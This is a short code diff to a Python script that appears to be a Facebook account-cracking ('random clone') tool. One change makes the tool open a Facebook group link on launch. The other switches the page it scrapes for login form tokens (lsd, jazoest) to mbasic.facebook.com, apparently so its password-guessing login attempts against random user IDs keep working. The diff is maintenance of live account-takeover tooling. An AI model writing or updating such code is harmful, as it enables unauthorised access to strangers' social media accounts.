@@ -177,7 +177,7 @@ class Main:
         self.loop = 0
         os.system("clear")
         print(logo)
-    #    os.system('xdg-open fb://group/1885398221816745?ref=share&mibextid=NSMWBT')
+        os.system('xdg-open fb://group/1885398221816745?ref=share&mibextid=NSMWBT')
         print('\033[1;31m[\033[1;32m1\033[1;31m]  \x1b[38;5;46m START🔴 RANDOM CLONE')
         print('\033[1;31m[\033[1;32m2\033[1;31m]  \x1b[38;5;46m EXIT')
         print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
@@ -240,7 +240,7 @@ def rcrack1(uid,pwx,tl):
             bi = random.choice([A,B,C,D,E,F,G,H])
             sys.stdout.write(f'\r \033[1;31m[%sSABBIR\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
             sys.stdout.flush()
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
